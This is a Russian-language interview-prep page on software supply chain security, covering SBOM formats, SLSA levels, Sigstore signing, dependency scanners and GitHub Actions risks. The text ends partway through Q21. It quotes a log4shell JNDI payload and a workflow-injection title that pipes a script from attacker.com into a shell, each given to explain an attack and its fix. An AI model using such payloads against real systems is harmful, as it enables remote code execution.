---
title: "Вопросы на собеседовании: Supply Chain Security"
description: "Software supply chain security: SBOM, SLSA, Sigstore, Cosign, Dependabot, Trivy, SolarWinds, log4shell, xz backdoor, CycloneDX, SPDX, signed artifacts"
tags:
  - interview
  - security
  - supply-chain-security-interview
type: "interview"
difficulty: "intermediate"
aliases:
  - "Вопросы на собеседовании"
  - "Supply Chain Security"
  - "SBOM interview"
  - "SLSA framework"
prerequisites: []
next: []
updated: "2026-04-25"
---
# Вопросы на собеседовании: `Supply Chain Security`

`Software Supply Chain Security` — защита кода, зависимостей, процесса сборки и артефактов от **подмены (tampering) и компрометации**. После инцидентов — **SolarWinds (2020)**, **log4shell (2021)**, **xz utils backdoor (2024)** — тема стала **высшим приоритетом**. Инструменты: **SBOM** (опись компонентов), **SLSA** (фреймворк), **Sigstore/Cosign** (подпись), **Dependabot/Trivy** (сканирование).

## Полезные ссылки

### Официальная документация и авторитетные источники

- [SLSA Framework](https://slsa.dev/) — supply chain levels
- [Sigstore](https://www.sigstore.dev/) — keyless signing
- [CycloneDX SBOM](https://cyclonedx.org/) — OWASP SBOM standard
- [SPDX](https://spdx.dev/) — Linux Foundation SBOM standard
- [CNCF Software Supply Chain Best Practices](https://github.com/cncf/tag-security/blob/main/supply-chain-security/supply-chain-security-paper/CNCF_SSCP_v1.pdf)
- [NIST SSDF (SP 800-218)](https://csrc.nist.gov/publications/detail/sp/800-218/final)

## Содержание

- [Полезные ссылки](#полезные-ссылки)
- [See also](#see-also)

**Базовые понятия**
- [Q1. (!) Что такое supply chain attack?](#q1--что-такое-supply-chain-attack)
- [Q2. (!) Известные incidents (SolarWinds, log4shell, xz)?](#q2--известные-incidents-solarwinds-log4shell-xz)
- [Q3. (!) Типы supply chain attacks?](#q3--типы-supply-chain-attacks)

**SBOM**
- [Q4. (!) Что такое SBOM?](#q4--что-такое-sbom)
- [Q5. (!) SPDX vs CycloneDX?](#q5--spdx-vs-cyclonedx)
- [Q6. Как генерировать SBOM?](#q6-как-генерировать-sbom)

**SLSA**
- [Q7. (!) Что такое SLSA framework?](#q7--что-такое-slsa-framework)
- [Q8. (!) SLSA levels 1-4?](#q8--slsa-levels-1-4)

**Signing**
- [Q9. (!) Зачем подписывать artifacts?](#q9--зачем-подписывать-artifacts)
- [Q10. (!) Sigstore и Cosign?](#q10--sigstore-и-cosign)
- [Q11. Keyless signing (Fulcio, Rekor)?](#q11-keyless-signing-fulcio-rekor)
- [Q12. In-toto attestations?](#q12-in-toto-attestations)

**Dependency scanning**
- [Q13. (!) Dependabot vs Renovate?](#q13--dependabot-vs-renovate)
- [Q14. (!) Trivy, Snyk, Grype — сравнение?](#q14--trivy-snyk-grype--сравнение)
- [Q15. CVE vs GHSA database?](#q15-cve-vs-ghsa-database)

**Build integrity**
- [Q16. (!) Reproducible builds?](#q16--reproducible-builds)
- [Q17. Hermetic builds (Bazel, Nix)?](#q17-hermetic-builds-bazel-nix)
- [Q18. Provenance (who built what)?](#q18-provenance-who-built-what)

**CI/CD security**
- [Q19. (!) GitHub Actions supply chain risks?](#q19--github-actions-supply-chain-risks)
- [Q20. OIDC для CI (без long-lived credentials)?](#q20-oidc-для-ci-без-long-lived-credentials)
- [Q21. Pinned dependencies (hash vs version)?](#q21-pinned-dependencies-hash-vs-version)

**Practical**
- [Q22. (!) Как защититься от typosquatting?](#q22--как-защититься-от-typosquatting)
- [Q23. (!) Vendor risk assessment?](#q23--vendor-risk-assessment)
- [Q24. Supply chain security roadmap?](#q24-supply-chain-security-roadmap)

## Q1. (!) Что такое supply chain attack?

**Supply chain attack** — атака **не напрямую на цель**, а через **доверенных посредников**: вендоров, зависимости, инструменты сборки, CI/CD.

**Идея:** если не получается пробить защищённую организацию, **скомпрометируйте её поставщика**. Его канал обновлений доставит вредонос **от вашего имени** (как доверенный источник).

**Поверхность атаки:**
```
Source code → Build → Artifact → Distribution → Install → Runtime
     ↑           ↑         ↑           ↑            ↑         ↑
   steal      inject    tamper      MITM        compromise  execute
   secret     malware   binary                  package
```

**Почему это работает:**
- Софт неявно доверяет зависимостям (тысячи транзитивных deps)
- Обновления применяются автоматически (доверие к подписям вендора)
- Компрометация **1 популярной библиотеки** = тысячи жертв
- Обнаружение затруднено (вредоносный коммит хорошо спрятан)

**Из реальной жизни:**
- NPM-пакеты с 1M+ загрузок скомпрометированы через украденные учётки мейнтейнеров
- Образы Docker Hub с криптомайнерами
- Typosquatting в PyPI (`requests` vs `reqeusts`)

**Последствия:** **взрыв вниз по цепочке** — 1 компрометация → сотни организаций.

## Q2. (!) Известные incidents (SolarWinds, log4shell, xz)?

**SolarWinds / SUNBURST (дек. 2020):**
- APT-группа (российская СВР) скомпрометировала **SolarWinds Orion** (мониторинг сети)
- Вредоносный код попал в обновление, подписанное сертификатом SolarWinds
- **18 000+ клиентов** скачали бэкдор; ~100 атакованы активно
- Жертвы: казначейство США, DHS, Microsoft, FireEye
- Урок: компрометация build-пайплайна → подписанный вредонос

**log4shell / CVE-2021-44228 (дек. 2021):**
- RCE в **Apache log4j 2.x** — JNDI-инъекция через сообщение лога
- `${jndi:ldap://attacker.com/exploit}` в любой залогированной строке → RCE
- **CVSS 10.0** — максимальная серьёзность
- **Везде:** Minecraft, iCloud, Steam, миллионы приложений
- Урок: уязвимости транзитивных зависимостей; нужен SBOM; время до патча критично

**xz utils backdoor / CVE-2024-3094 (март 2024):**
- Долгоиграющая **социальная инженерия**: атакующий «Jia Tan» 2+ года контрибьютил в xz utils (библиотека сжатия)
- Стал мейнтейнером, вставил **бэкдор** в `liblzma` → обход SSH-аутентификации
- Затронул unstable-ветки Debian/Ubuntu; **обнаружен случайно** инженером Microsoft (sshd тормозил)
- Урок: критичная инфраструктура с единственным мейнтейнером уязвима; человеческий фактор

**codecov (2021):** инструмент CI-покрытия скомпрометирован → переменные окружения утекли из многих организаций.

**event-stream (2018):** NPM-пакет передан атакующему → вредоносный код для кражи Bitcoin-кошельков.

**Итог:** время сборки, зависимости и **человек** — всё это векторы атаки.

## Q3. (!) Типы supply chain attacks?

**По вектору:**

**1. Dependency confusion:**
- Атакующий публикует пакет с тем же именем в публичном реестре; CI тянет версию атакующего вместо приватной
- Решение: явные scopes, приоритет внутреннего реестра

**2. Typosquatting:**
- Похожие имена: `urllib` vs `urllib3` vs `ur11ib3` → ставится по опечатке

**3. Protestware / действия мейнтейнера:**
- Легитимный мейнтейнер добавляет вредоносный код (политика, выгорание, продал права)
- Пример: `node-ipc` 2022 — мейнтейнер добавил код, удаляющий файлы на российских IP

**4. Скомпрометированный аккаунт:**
- Украденные учётки npm/PyPI → публикация вредоносной версии
- Пример: ua-parser-js, coa, rc (2021)

**5. Компрометация build-системы:**
- Атакующий внедряется в CI → подписанный артефакт содержит вредонос
- Пример: SolarWinds

**6. Компрометация репозитория исходников:**
- Push в GitHub по украденному токену
- Пример: Git-сервер PHP (2021) — атакующие запушили бэкдор в php-src

**7. Уязвимость в upstream:**
- У транзитивной зависимости есть CVE (например, log4shell в любом Java-приложении)

**8. Спящая / долгая игра (long-con):**
- Годами выстраивают доверие, затем внедряют вредонос (xz)

**9. Захват / угон пакета:**
- Атакующий регистрирует имя заброшенного пакета

**10. Атака на CDN / зеркало:**
- Подмена на уровне распространения

**Контрмеры:** SBOM, подпись, SLSA, ревью зависимостей, закреплённые версии, воспроизводимые сборки.

## Q4. (!) Что такое SBOM?

**SBOM (Software Bill of Materials)** — **опись** всех компонентов (прямых + транзитивных) в ПО: библиотеки, версии, лицензии, происхождение.

**Аналогия:** как **этикетка состава продукта** — «содержит: пшеницу, сою, …» — но для софта.

**Зачем:**
- **Реакция на уязвимости:** log4shell — «есть ли у нас log4j?» SBOM даёт мгновенный ответ
- **Лицензионный комплаенс:** какие GPL/AGPL в кодовой базе?
- **Регуляторика:** Executive Order 14028 в США (2021) — SBOM обязателен для федерального ПО; EU CRA (2024)
- **Due diligence по вендору:** понимать, что внутри, до покупки

**Содержимое:**
```json
{
  "component": "spring-core",
  "version": "5.3.20",
  "supplier": "VMware",
  "license": "Apache-2.0",
  "hash": "sha256:abc123...",
  "dependencies": ["spring-jcl:5.3.20", ...]
}
```

**Форматы:**
- **SPDX** (Linux Foundation) — ISO-стандарт
- **CycloneDX** (OWASP) — с фокусом на безопасность
- **SWID tags** — более старый, менее распространённый

**Генерация:** автоматически на этапе сборки (а не вручную).

**Глубина:** в идеале **транзитивные зависимости + хеши на уровне файлов** (знать, какие именно байты поставлены).

## Q5. (!) SPDX vs CycloneDX?

**SPDX:**
- Linux Foundation, **ISO/IEC 5962:2021**
- Фокус: **лицензирование, комплаенс, метаданные**
- Форматы: Tag-Value, JSON, YAML, RDF/XML
- Глубоко интегрирован с юридическим ревью
- Меньше ориентирован на безопасность

**CycloneDX:**
- Проект OWASP (2017)
- Фокус: **безопасность, уязвимости**
- Форматы: JSON, XML, Protobuf
- Нативная поддержка VEX (Vulnerability Exploitability eXchange)
- Сервисы, фреймворки, ML-модели, криптография (варианты SBOM: SaaSBOM, MLBOM, CBOM)

**Сравнение:**

| Аспект | SPDX | CycloneDX |
|--------|------|-----------|
| Происхождение | Linux Foundation | OWASP |
| Фокус | Комплаенс/лицензии | Безопасность |
| Возраст | 2011 | 2017 |
| Объём | Многословный | Компактный |
| Экосистема | Силён в FOSS/юр. | Силён в security-тулинге |
| Инструменты | Syft, SPDX tools | Syft, CycloneDX CLI |

**Прагматично:** сейчас **генерируют оба** (тулинг поддерживает оба) — CycloneDX чаще для security-процессов, SPDX для юридических/комплаенс-задач.

**Тренд индустрии:** большинство организаций генерируют **оба** (инструменты вроде `syft` поддерживают генерацию каждого одной командой).

## Q6. Как генерировать SBOM?

**Инструменты под конкретные языки:**

**Java (Maven):**
```xml
<plugin>
  <groupId>org.cyclonedx</groupId>
  <artifactId>cyclonedx-maven-plugin</artifactId>
</plugin>
```
`mvn cyclonedx:makeAggregateBom` → `target/bom.json`

**Node.js:**
```bash
npm sbom --sbom-format=cyclonedx  # npm 10+
# or:
npx @cyclonedx/cyclonedx-npm --output-file sbom.json
```

**Python:**
```bash
cyclonedx-py --format json -o sbom.json
```

**Go:**
```bash
cyclonedx-gomod mod -output sbom.json
```

**Универсальный: Syft (Anchore):**
```bash
syft dir:. -o cyclonedx-json > sbom.json
syft image:myapp:1.0 -o spdx-json > sbom.json
```

**Образы контейнеров:**
```bash
# Docker (Docker 23+)
docker sbom myapp:1.0

# Buildx builds with SBOM attestation
docker buildx build --sbom=true --push ...
```

**В CI/CD (GitHub Actions):**
```yaml
- uses: anchore/sbom-action@v0
  with:
    format: cyclonedx-json
    output-file: sbom.json
```

**Сохранить как артефакт** и **приложить к релизу**; также пушить на сервер dependency-track для непрерывного мониторинга.

## Q7. (!) Что такое SLSA framework?

**SLSA (Supply-chain Levels for Software Artifacts)** — **читается «salsa»** — фреймворк от Google/Linux Foundation. Определяет **уровни зрелости** для безопасности build-пайплайна.

**Цель:** доказать, что артефакт **собран как заявлено** (без подмены).

**Какие угрозы закрывает:**
- **Целостность исходников:** подмена коммитов, украденные учётки
- **Целостность сборки:** вредоносный инструмент сборки, угон параллельной сборки
- **Целостность распространения:** подменённые бинарники на зеркале

**Ключевые понятия:**
- **Provenance:** метаданные — **где/как/кем** собран артефакт
- **Attestations:** подписанные утверждения («сборка прошла тесты», «просканировано на CVE»)
- **Доверенные сборщики (builders):** изолированный, аудируемый CI

**Чего SLSA не делает:**
- Не отвечает за качество/корректность кода (это отдельно)
- Не про runtime-безопасность
- Не предотвращает баги в зависимостях

**Внедрение:** внутри Google, GitHub Actions (билдер SLSA L3), Kubernetes.

**Версия:** 1.0 выпущена в 2023.

## Q8. (!) SLSA levels 1-4?

**L1 — задокументированный процесс сборки:**
- Есть скрипт сборки
- Генерируется provenance (автоматически, без подделки)
- Минимум усилий, базовый уровень

**L2 — размещённая (hosted) сборка:**
- Используется система контроля версий
- Размещённый build-сервис (GitHub Actions, CircleCI — не локальный ноутбук)
- Подписанный provenance
- Защищает от случайной/непрофессиональной подмены

**L3 — усиленная (hardened) сборка:**
- **Изолированный сборщик** (нет влияния параллельных арендаторов)
- **Неподделываемый provenance** (эфемерная identity, OIDC)
- Источник + build-платформа **принудительно проверяются** (обход невозможен)
- Пример: GitHub Actions с `slsa-github-generator`

**L4 — изначально самый строгий (упразднён в 1.0):**
- Ревью всех изменений двумя людьми
- Герметичные + воспроизводимые сборки
- Строже, чем большинство организаций готовы терпеть

**SLSA 1.0 (2023):**
- Стандартизирован только **Build track** (Source- и Dependency-tracks в работе)
- Уровни: Build L1, L2, L3
- L4 убран — упор на реалистичное внедрение

**Прагматичный путь:**
1. **L1** — несколько дней
2. **L2** — перенести сборки в доверенный CI, подписывать артефакты
3. **L3** — использовать SLSA-генератор, принудительно проверять provenance

**Потребители:** через `slsa-verifier` проверяют provenance перед деплоем.

## Q9. (!) Зачем подписывать artifacts?

**Signing** — **цифровая подпись** на артефакте (JAR, Docker-образ, бинарник) приватным ключом → потребитель проверяет публичным ключом.

**Что даёт:**
- **Подлинность:** артефакт действительно от заявленного издателя
- **Целостность:** не изменён после подписи
- **Неотказуемость:** издатель не может отрицать авторство

**Без подписи:**
- MITM-атака: подмена пакета в пути
- Скомпрометированное зеркало: раздаёт вредонос
- Отравление CDN / кеша

**Примеры:**
- **Apt:** GPG-подписи на `.deb`-пакетах; `apt` проверяет перед установкой
- **Maven Central:** GPG-подписи на JAR (обязательны для публикации)
- **Docker:** подписи Notary / Cosign на образах
- **npm:** подписи постепенно внедряются

**Традиционные болевые точки:**
- Управление ключами (где хранить, как ротировать?)
- Компрометация приватного ключа = катастрофа
- Трение для разработчика (подписывать вручную? автоматизировать?)

**Современное решение:** **keyless**-подпись (Sigstore).

**Проверка — ключевой момент:** подписанный артефакт без проверки = всё равно небезопасен. Принудительно проверяйте в deploy-пайплайне:
```bash
cosign verify --certificate-identity=... --certificate-oidc-issuer=... image:tag
```

## Q10. (!) Sigstore и Cosign?

**Sigstore** — проект Linux Foundation (2021). **Бесплатная keyless-подпись артефактов**. Поддерживается Google, RedHat, GitHub.

**Ключевые компоненты:**
- **Cosign** — CLI для подписи/проверки
- **Fulcio** — CA, выпускающий короткоживущие сертификаты (10 мин)
- **Rekor** — transparency-лог (append-only, аудируемый)
- **Cosign** — инструмент, объединяющий всё

**Архитектура:**
```
Developer
  ↓ "sign"
OIDC token (Google/GitHub/Microsoft)
  ↓ (проверяет identity)
Fulcio CA → ephemeral cert (valid 10 min)
  ↓ signs artifact
Cosign → uploads signature + cert
  ↓
Rekor (transparency log) ← immutable record
```

**Преимущества:**
- **Нет долгоживущих ключей** (нечего компрометировать)
- **Identity = OIDC** (email разработчика, GitHub-репозиторий)
- **Аудируемость** (лог Rekor)
- **Бесплатно** (публичный сервис)

**Cosign — подпись образа:**
```bash
cosign sign --yes ghcr.io/myorg/app:1.0
# Opens browser → sign in with Google/GitHub
# Cert issued, artifact signed, entry в Rekor
```

**Проверка:**
```bash
cosign verify \
  --certificate-identity=https://github.com/myorg/build.yml@refs/heads/main \
  --certificate-oidc-issuer=https://token.actions.githubusercontent.com \
  ghcr.io/myorg/app:1.0
```

**Жёсткое доверие:** проверьте, что identity совпадает с ожидаемым путём GitHub-workflow → гарантирует, что артефакт собран **вашим** CI, а не атакующим.

## Q11. Keyless signing (Fulcio, Rekor)?

**Keyless** — подпись без **долгоживущего приватного ключа**. Ключ существует только 10 минут.

**Как это работает:**

1. **Разработчик аутентифицируется** через OIDC (SSO-identity)
2. **Fulcio** (CA) проверяет OIDC-токен → выпускает X.509-сертификат, привязывающий identity → эфемерная пара ключей
3. **Cosign** подписывает артефакт эфемерным ключом
4. Подпись + сертификат + запись в Rekor сохраняются

**Эфемерный ключ уничтожается** после подписи. Даже если украдут, он истекает за 10 минут.

**Fulcio (CA):**
- Публичный CA (управляется Linux Foundation)
- Выпускает сертификат, связывающий (email / subject) → публичный ключ
- Якорь доверия: корневой сертификат Sigstore

**Rekor (transparency-лог):**
- Append-only дерево Меркла (как Certificate Transparency)
- Каждая подпись фиксируется
- Доступен для публичных запросов
- Обнаруживает ретроспективную подмену (подписавший не может «отозвать публикацию»)

**Проверка без приватного ключа:**
- Сертификат имеет короткий срок действия
- Проверяем цепочку сертификатов до корня Sigstore
- Проверяем в Rekor наличие записи и timestamp (подпись сделана в период действия сертификата)

**Пример:**
```bash
# Identity from GitHub Actions workflow
cosign sign-blob --yes artifact.tar.gz  # no key file!
```

**Выигрыш в безопасности:** нет проблемы «храни ключ надёжно». Ключ никогда не существует вне эфемерного CI-джоба.

## Q12. In-toto attestations?

**in-toto** — фреймворк, определяющий **структурированные подписанные утверждения** об артефакте.

**Attestation** — подписанный JSON:
```json
{
  "subject": [{"name": "myapp", "digest": {"sha256": "abc123..."}}],
  "predicateType": "https://slsa.dev/provenance/v1",
  "predicate": {
    "buildDefinition": {...},
    "runDetails": {
      "builder": {"id": "https://github.com/actions/runner"},
      "metadata": {"invocationID": "..."}
    }
  }
}
```

**Predicates (типы утверждений):**
- `slsa-provenance` — SLSA-provenance
- `cyclonedx` — attestation для SBOM
- `vuln` — результат сканирования уязвимостей
- `test` — тесты пройдены
- `policy` — соответствие кастомной политике

**Поток:**
```
Source commit
  ↓ (attest: code reviewed by X)
Build
  ↓ (attest: SLSA provenance)
Test
  ↓ (attest: tests passed)
Scan
  ↓ (attest: no critical CVEs)
Deploy
  ↓ (policy checks all attestations)
```

**Принуждение (enforcement):** admission controller (Kyverno, Gatekeeper) блокирует деплой без требуемых attestations.

**Пример (Cosign attest):**
```bash
cosign attest --predicate sbom.json --type cyclonedx image:tag
cosign attest --predicate scan.json --type vuln image:tag
```

**Проверка:**
```bash
cosign verify-attestation --type cyclonedx --certificate-identity=... image:tag
```

**Цепочка доверия:** потребители строят политику, требующую конкретные predicates от конкретных сборщиков → доверенный артефакт.

## Q13. (!) Dependabot vs Renovate?

**Оба:** автоматизированное обновление зависимостей (PR на апдейт библиотек).

**Dependabot (GitHub):**
- Нативный в GitHub (бесплатен для всех репозиториев)
- Конфиг: `.github/dependabot.yml`
- PR на каждую зависимость (один PR на обновление)
- Security advisories из GitHub Advisory Database
- Автоматическая группировка (v2)
- Работает с: npm, Maven, pip, Cargo, Go modules, Gradle, NuGet, composer, Docker, GitHub Actions

**Renovate (Mend):**
- Open source, self-hosted или облако
- Более настраиваемый (пресеты, regex, кастомные менеджеры)
- Гибче группировка и стратегии merge
- Поддерживает больше пакетных менеджеров (Helm, Terraform, манифесты Kubernetes)
- **Auto-merge** настраиваемый (например, авто-merge патчей)

**Сравнение:**

| Аспект | Dependabot | Renovate |
|--------|------------|----------|
| Настройка | Нулевая (GitHub) | Добавить бота/workflow |
| Конфиг | Простой YAML | Богатый JSON |
| Группировка | Базовая | Мощная |
| Кастомные менеджеры | Ограниченно | Regex-кастом |
| Auto-merge | Менее гибкий | Гибкий |
| Расписание | Фиксированная частота | Cron-стиль |
| Экосистемы | Распространённые | Шире |

**Выбор:**
- **Dependabot** — по умолчанию для GitHub, малые/средние репозитории, простота
- **Renovate** — большой монорепо, нужна кастомизация, GitLab, многоязычный стек

**Best practice:**
- Включить security-обновления (авто-PR при CVE)
- Еженедельное расписание для version-обновлений (избегать ежедневного шума)
- Группировать minor/patch-обновления (меньше PR)
- CI должен проходить перед merge

## Q14. (!) Trivy, Snyk, Grype — сравнение?

**Trivy (Aqua Security):**
- **Бесплатный, open source**
- Сканирует: образы контейнеров, файловые системы, git-репозитории, кластеры K8s, SBOM, IaC (Terraform), секреты
- Быстрый, всесторонний
- Дружелюбен к CI (вывод SARIF для GitHub)
- Широко используется (де-факто лидер среди open source)

**Snyk:**
- **Коммерческий** (бесплатный тариф ограничен)
- Сканирует: код (SAST), зависимости, контейнеры, IaC
- Богатые подсказки по исправлению (авто-PR)
- Проприетарная БД уязвимостей (часто опережает публичные)
- Глубокие интеграции (IDE, CI, комментарии в PR)

**Grype (Anchore):**
- Бесплатный, open source
- Фокус на **сканировании уязвимостей** SBOM и образов
- В паре с **Syft** (генерация SBOM)
- Простой, быстрый

**Сравнение:**

| Аспект | Trivy | Snyk | Grype |
|--------|-------|------|-------|
| Лицензия | Бесплатный | Коммерческий | Бесплатный |
| БД CVE | NVD, OSV, GHSA | Проприетарная + публичные | NVD, GHSA |
| Охват | Широкий (IaC, секреты, SBOM) | Широкий (плюс SAST) | Узкий (уязвимости) |
| Подсказки по фиксу | Базовые | Богатые | Базовые |
| Генерация SBOM | Да | Нет | Нет (нужен Syft) |
| Плагины IDE | Ограниченно | Богато | Нет |

**Типичный стек:**
- **Dev**: Snyk (богатая интеграция с IDE) или Trivy
- **CI**: Trivy (бесплатный, быстрый)
- **Registry**: сканирование Trivy / ECR scan
- **Runtime**: Falco + Kubescape

**Ложные срабатывания:** есть у всех; VEX (CycloneDX) позволяет отметить «не эксплуатируемо».

## Q15. CVE vs GHSA database?

**CVE (Common Vulnerabilities and Exposures):**
- Ведёт **MITRE**; финансируется DHS США
- **CVE ID:** `CVE-2021-44228` (log4shell)
- Глобальный канонический идентификатор
- **NVD** (National Vulnerability Database) — NIST анализирует и оценивает
- Задержка: дни/недели между раскрытием и присвоением CVE

**GHSA (GitHub Security Advisories):**
- БД, поддерживаемая GitHub
- `GHSA-xxxx-xxxx-xxxx`
- Часто **быстрее** — мейнтейнеры публикуют там раньше, чем появится CVE
- Богатые метаданные: затронутые версии, патчи, ссылки
- Сопоставляется с CVE при присвоении

**OSV (Open Source Vulnerabilities):**
- Унифицированный формат от Google
- Агрегирует: GHSA, PyPI, npm, RustSec, GSD
- Машиночитаемый JSON
- API: `osv.dev`

**Как используют сканеры:**
- Dependabot → GHSA (нативно для GitHub)
- Trivy → NVD + GHSA + OSV + источники под конкретные языки
- Snyk → проприетарная + публичные

**Сопоставление ID:** у одной уязвимости могут быть GHSA + CVE + advisory вендора. Инструменты дедуплицируют.

**Серьёзность:** **CVSS score** (0–10) — вычисляется NVD / вендором. Но **CVSS часто не отражает эксплуатируемость в твоём контексте** (помогает VEX).

**CVSS 4.0 (2023):** улучшен, но внедряется медленно; CVSS 3.1 всё ещё доминирует.

## Q16. (!) Reproducible builds?

**Reproducible build** — одни и те же исходники → **байт-в-байт идентичный** бинарник, независимо от того, когда/где/кем собран.

**Зачем:**
- **Проверка:** любой может пересобрать и сравнить хеш → доверять опубликованному бинарнику
- **Обнаружение подмены:** атака уровня SolarWinds — расхождение будет поймано
- Компонент **SLSA Level 4**

**Проблемы (недетерминизм):**
- Timestamps, зашитые в артефакты
- Случайные ID (UUID)
- Зависимость от путей (`/home/user/project` vs `/builds/project`)
- Порядок параллельной компиляции
- Локаль / часовой пояс (например, сортировка по локали)
- Различия в версиях компилятора

**Исправления:**
- **`SOURCE_DATE_EPOCH`** — env-переменная для фиксированного timestamp
- Стабильная сортировка вывода
- Зачистка путей
- Закреплённый компилятор, детерминированные флаги

**Инструменты:**
- **reproducible-builds.org** — стандарт + инструменты
- **diffoscope** — глубокий diff двух бинарников
- **Debian reproducible builds** — 96%+ пакетов Debian воспроизводимы
- **Nix** — спроектирован под воспроизводимость

**По языкам:**
- Go — в основном воспроизводим (с 1.10)
- Rust — воспроизводим с усилиями
- Java JAR — требует аккуратности (timestamps в ZIP)

**Из реальной жизни:** Bitcoin Core, Tor — воспроизводимы; несколько разработчиков пересобирают и сравнивают.

**Ограничение:** не покрывает **сами исходники** (исходник может быть вредоносным, даже если собирается воспроизводимо).

## Q17. Hermetic builds (Bazel, Nix)?

**Hermetic build** — сборка читает **ТОЛЬКО объявленные входы** (исходники + явно перечисленные deps). Никакой сети, никакого состояния системы, никаких неявных зависимостей.

**Отличия от воспроизводимой:**
- Reproducible: выход = одни и те же байты
- Hermetic: входы = полностью объявлены
- Hermetic → помогает reproducible (но reproducible возможен и без герметичности)

**Почему это важно:**
- **Никакого «у меня работает»** — системные библиотеки не просачиваются
- **Корректность кеша** — если объявленные входы не менялись, кешированный вывод валиден
- **Безопасность:** нет сети во время сборки — нельзя подтянуть вредоносные deps на этапе сборки
- Требуется для **SLSA L3+**

**Инструменты:**

**Bazel:**
- Система сборки от Google (для Java, Go, C++, Python)
- Сборки в песочнице: воркеры в chroot/контейнерах
- Объявленные deps в `BUILD`-файлах
- Удалённый кеш + удалённое выполнение

**Nix:**
- Функциональный пакетный менеджер
- `nix build` выполняется в песочнице, детерминирован
- Воспроизводим за счёт криптографических хешей входов
- Чистые функции: `drv(inputs) → output`

**Другие:**
- **Buck** (Meta) — как Bazel
- **Pants** (Toolchain)

**Практическая сложность:**
- Перевод существующего Makefile-проекта — большой объём работы
- На зелёной площадке: внедрять Bazel/Nix с самого начала

**ROI:**
- Огромный монорепо (Google, Meta) — необходимо (cache hits 90%+)
- Маленький репозиторий — избыточно

## Q18. Provenance (who built what)?

**Provenance** — подписанные метаданные, описывающие **происхождение** артефакта: коммит, сборщик, timestamp, окружение.

**Схема SLSA Provenance (v1):**
```json
{
  "buildDefinition": {
    "buildType": "https://github.com/slsa-framework/slsa-github-generator/generic@v1",
    "externalParameters": {
      "source": "git+https://github.com/myorg/myrepo@sha1:abc123"
    },
    "resolvedDependencies": [...]
  },
  "runDetails": {
    "builder": {"id": "https://github.com/actions/runner"},
    "metadata": {
      "invocationID": "https://github.com/myorg/myrepo/actions/runs/1234",
      "startedOn": "2024-01-15T10:00:00Z",
      "finishedOn": "2024-01-15T10:05:00Z"
    }
  }
}
```

**Зачем:**
- Доверие: «этот JAR собран нашим GitHub Actions из коммита X» — проверяемо
- Реакция на инцидент: скомпрометированная библиотека — все артефакты, ссылающиеся на неё, можно найти
- SLSA L3+: неподделываемо (сборщик подписывает, разработчик не может сфабриковать)

**Генерация:**
- GitHub Actions: официальный action `slsa-github-generator`
- GitLab: собственный provenance с 2023
- Tekton Chains: добавляет provenance ко всем сборкам

**Проверка:**
```bash
slsa-verifier verify-artifact myapp.tar.gz \
  --source-uri github.com/myorg/myrepo \
  --source-tag v1.0 \
  --provenance-path myapp.intoto.jsonl
```

**Политика:** admission controller проверяет, что provenance соответствует ожидаемому репозиторию + ветке.

## Q19. (!) GitHub Actions supply chain risks?

**Поверхность рисков GitHub Actions:**

**1. Скомпрометированные сторонние actions:**
- Привязка к ветке (`@main`) → выполняется любой коммит. Атакующий компрометирует action → все потребители запускают вредоносный код
- **Фикс:** привязка к **commit SHA**: `uses: org/action@abc123...`
- Dependabot обновляет SHA с ревью

**2. Pwn-запросы:**
- Событие `pull_request_target` выполняется с правами на запись для PR из форка
- Код из форка атакующего выполняется с доступом к секретам
- Фикс: избегать `pull_request_target` или использовать `pull_request` (без секретов)

**3. Утечка секретов:**
- Action печатает секрет в лог (даже случайно)
- `echo "token: $TOKEN"` → засветился
- GitHub маскирует известные секреты, но ловит не всегда

**4. Повышение привилегий через раннер:**
- Self-hosted-раннеры переиспользуются → состояние прошлого джоба сохраняется
- PR атакующего → раннер → компрометация будущих джобов
- Фикс: эфемерные раннеры; не использовать self-hosted для публичных репозиториев

**5. Инъекция в workflow:**
- Использование `${{ github.event.issue.title }}` в shell:
  ```yaml
  run: echo "${{ github.event.issue.title }}"
  ```
- Заголовок: `"); curl attacker.com | sh # ` → инъекция
- Фикс: **всегда правильно экранировать** или использовать env:
  ```yaml
  env:
    TITLE: ${{ github.event.issue.title }}
  run: echo "$TITLE"
  ```

**6. Права токена:**
- У `GITHUB_TOKEN` права по умолчанию широкие
- Минимизировать: `permissions: contents: read` в джобе

**Эшелонированная защита (defense-in-depth):**
- `allowed_actions` в настройках организации (allowlist)
- Обязательные ревьюеры на секреты окружения
- Усиленные раннеры (`actions/checkout@...` с привязкой)
- OIDC к облаку (без хранимых учёток)
- Сканирование workflow правилами Semgrep

## Q20. OIDC для CI (без long-lived credentials)?

**Проблема:** CI нужны учётки AWS/GCP/Azure → хранимые секреты → риск утечки.

**Решение: OIDC workload federation.** CI-провайдер (GitHub, GitLab, CircleCI) выпускает JWT → облачный провайдер доверяет JWT → короткоживущие учётки.

**GitHub Actions → AWS:**
```yaml
permissions:
  id-token: write  # allows OIDC token issuance
  contents: read

steps:
  - uses: aws-actions/configure-aws-credentials@v4
    with:
      role-to-assume: arn:aws:iam::123:role/deploy
      aws-region: us-east-1
```

**Сторона AWS (trust policy):**
```json
{
  "Effect": "Allow",
  "Principal": {
    "Federated": "arn:aws:iam::123:oidc-provider/token.actions.githubusercontent.com"
  },
  "Action": "sts:AssumeRoleWithWebIdentity",
  "Condition": {
    "StringEquals": {
      "token.actions.githubusercontent.com:sub": "repo:myorg/myrepo:ref:refs/heads/main"
    }
  }
}
```

**Поток:**
1. Workflow стартует → GitHub чеканит JWT с claims (репозиторий, ветка)
2. Action отправляет JWT в AWS STS `AssumeRoleWithWebIdentity`
3. AWS проверяет подпись JWT (публичные ключи GitHub) + условие (совпадение репозитория/ветки)
4. Возвращает временные учётки (1 ч)

**Преимущества:**
- **Нет долгоживущих ключей** в секретах
- **Гранулярное доверие** (на репозиторий/ветку)
- **Аудируемость** (CloudTrail)
- Ротация не нужна

**Поддерживается:** AWS, GCP, Azure, HashiCorp Cloud, Vault и многие другие.

**Best practice:** перевести весь CI → облачную аутентификацию через OIDC; удалить access-ключи IAM-пользователей.

## Q21. Pinned dependencies (hash vs version)?

**Закрепление по версии (version pin):**
```json
"lodash": "4.17.21"
```
- Если `4.17.21` уже опубликована, версия зафиксирована
- **НО:** npm допускает перезапись (редко, но возможно); скомпрометированный мейнтейнер → новый tarball с той же версией

**Закрепление по хешу (hash pin):**
```json
"lodash": "npm:lodash@4.17.21"
"integrity": "sha512-abc123..."
```
- `package-lock.json` / `yarn.lock` включают хеши
- Установка проверяет хеш; несовпадение = ошибка

**Почему hash pin необходим:**
